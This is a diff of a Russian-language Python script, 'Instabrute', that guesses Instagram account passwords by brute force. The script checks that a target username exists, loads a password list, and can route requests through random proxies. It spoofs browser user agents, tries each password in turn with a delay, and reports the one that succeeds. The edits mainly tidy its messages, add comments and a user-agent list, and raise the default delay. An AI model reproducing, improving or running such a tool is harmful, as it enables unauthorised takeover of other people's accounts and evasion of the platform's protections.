@@ -1,3 +1,4 @@
+# подключим библиотеки
 import requests
 import json
 import time
@@ -21,8 +22,7 @@ class Instabrute():
 		self.passwordsFile = passwordsFile
 		self.loadPasswords()
 		self.IsUserExists()
-
-
+#запрос разрешения на использование прокси(с отдельного файла подтягиваеться)
 		UsePorxy = Input('[*] Вы желаете использовать прокси? (y/n): ').upper()
 		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
 			self.randomProxy()
@@ -35,9 +35,9 @@ class Instabrute():
 				self.passwords = f.read().splitlines()
 				passwordsNumber = len(self.passwords)
 				if (passwordsNumber > 0):
-					print ('[*] %s Пароли загружаются успешно....Скоро запущу ракеты :) ' % passwordsNumber)
+					print ('[*] %s Пароли загружаются успешно....Скоро начну работу.) ' % passwordsNumber)
 				else:
-					print('Файл паролей пуст, добавьте в него пароли. Боеголовок нет, Юра мы все проебали! ')
+					print('Файл паролей пуст, добавьте в него пароли и перезапустите скрпит! ')
 					Input('[*] Нажмите Enter, чтобы выйти ')
 					exit()
 		else:
@@ -55,10 +55,10 @@ class Instabrute():
 			self.UsedProxys.append(proxy)
 		try:
 			print('')
-			print('[*] Проверяю новый IPшник')
-			print ('[*] Ваш публчиный ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
+			print('[*] Проверяю новый IP адресс')
+			print ('[*] ВНИМАНИЕ! Ваш публчиный ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
 		except Exception as e:
-			print  ('[*] Не могу подключиться к прокси, хуйня какая то"%s"' % proxy)
+			print  ('[*] Не могу подключиться к данному прокси серверу "%s"' % proxy)
 		print('')
 
 
@@ -66,8 +66,8 @@ class Instabrute():
 	def IsUserExists(self):
 		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
 		if (r.status_code == 404):
-			print ('[*] Имя пользователя "%s" не обнаружено(проверьте правильность ввода имени)' % username)
-			Input('[*] Нажмите Enter чтобы выйти')
+			print ('[*] Имя пользователя "%s" не обнаружено(проверьте правильность ввода имени пользователя и повторите попытку)' % username)
+			Input('[*] Нажмите Enter чтобы завершить работу')
 			exit()
 		elif (r.status_code == 200):
 			return True
@@ -80,7 +80,12 @@ class Instabrute():
 
 		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 		sess.headers.update({
-			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
+			'UserAgent':'Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/533.30.2 (KHTML, like Gecko) Version/4.1 Safari/533.30.2',
+			#лист юзер агентов следует внизу
+		        #Mozilla/5.0 (Windows; U; Windows 98; Win 9x 4.90) AppleWebKit/533.30.2 (KHTML, like Gecko) Version/4.1 Safari/533.30.2
+		        #Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_3 rv:5.0) Gecko/20211126 Firefox/36.0
+		        #Mozilla/5.0 (Windows 98; sl-SI; rv:1.9.0.20) Gecko/20100626 Firefox/37.0
+			#также их можно взять здесь https://generate-name.net/user-agent
 			'x-instagram-ajax':'1',
 			'X-Requested-With': 'XMLHttpRequest',
 			'origin': 'https://www.instagram.com',
@@ -126,13 +131,13 @@ print
 
 
 
-instabrute = Instabrute(Input('Введи юзернейм(логин, для тех кто в танке): '))
+instabrute = Instabrute(Input('Введи юзернейм(логин пользователя): '))
 
 try:
-	delayLoop = int(Input('[*] Введи задержку , между попытками брута (в секундах, если что :)): ')) 
+	delayLoop = int(Input('[*] Введи задержку , между попытками перебора (в секундах:)): ')) 
 except Exception as e:
-	print ('[*] Ошибка, программное обеспечение использует значение по умолчанию "4" и хоть патчь меня, я не передумаю...Я вредный брутер, пиздец какой вредный :) ')
-	delayLoop = 4
+	print ('[*] Ошибка, программное обеспечение использует значение по умолчанию "5" и хоть патчь меня, я не передумаю..')
+	delayLoop = 5
 print ('')
 
 
@@ -140,14 +145,14 @@ print ('')
 for password in instabrute.passwords:
 	sess = instabrute.Login(password)
 	if sess:
-		print ('[*] Успешный вход в систему %s' % [instabrute.username,password])
+		print ('[*] Успешный вход в систему пользователя %s' % [instabrute.username,password])
 	else:
 		print ('[*] Пароль неверный [%s]' % password)
 
 	try:
 		time.sleep(delayLoop)
 	except KeyboardInterrupt:
-		WantToExit = str(Input('Нажмите y/n для выхода: ')).upper()
+		WantToExit = str(Input('Нажмите  y ИЛИ n для выхода: ')).upper()
 		if (WantToExit == 'Y' or WantToExit == 'YES'):
 			exit()
 		else:
